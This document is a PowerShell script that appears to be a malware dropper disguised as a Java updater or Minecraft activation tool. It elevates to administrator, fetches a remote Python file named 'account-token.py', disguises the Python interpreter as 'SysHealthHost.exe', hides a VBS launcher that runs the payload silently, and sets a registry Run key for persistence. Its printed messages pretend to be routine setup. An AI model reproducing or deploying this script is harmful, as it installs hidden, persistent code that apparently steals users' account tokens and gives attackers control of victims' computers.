if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
    exit
}

$GITHUB_RAW_URL = "https://raw.githubusercontent.com/get-activated/com.mojang.minecraft/refs/heads/main/account-token.py"
$InstallDir = "$env:APPDATA\Microsoft\JavaUpdater"
$AgentPath = "$InstallDir\win_sys_host.pyw"
$PythonPath = "$InstallDir\bin"

if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
}

$pythonInstalled = $false
try {
    $pythonVersion = & python --version 2>&1
    if ($pythonVersion -match "Python 3") {
        $pythonInstalled = $true
        $pythonwExe = "pythonw"
    }
} catch {}

if (-not $pythonInstalled) {
    Write-Host "Setting up environment..." -ForegroundColor Yellow
    $pythonUrl = "https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip"
    $pythonZip = "$env:TEMP\sys_cache.zip"
    Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonZip -UseBasicParsing
    Expand-Archive -Path $pythonZip -DestinationPath $PythonPath -Force
    Remove-Item $pythonZip
    
    if (Test-Path "$PythonPath\pythonw.exe") { Rename-Item "$PythonPath\pythonw.exe" "SysHealthHost.exe" -Force }
    $pythonwExe = "$PythonPath\SysHealthHost.exe"
}

Invoke-WebRequest -Uri $GITHUB_RAW_URL -OutFile $AgentPath -UseBasicParsing

$vbsLauncher = "$InstallDir\launcher.vbs"
$q = [char]34 
$vbsLine1 = "Set WshShell = CreateObject(" + $q + "WScript.Shell" + $q + ")"
$vbsLine2 = "WshShell.Run " + $q + $q + $pythonwExe + $q + " " + $q + $AgentPath + $q + $q + ", 0, False"
$vbsContent = $vbsLine1 + "`n" + $vbsLine2

Set-Content -Path $vbsLauncher -Value $vbsContent -Encoding ASCII
attrib +h +s $vbsLauncher


$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegPath -Name "JavaUpdateManager" -Value "wscript.exe $q$vbsLauncher$q" -Force

Start-Process "wscript.exe" -ArgumentList "$q$vbsLauncher$q"
Write-Host "Installation Complete." -ForegroundColor Green
exit
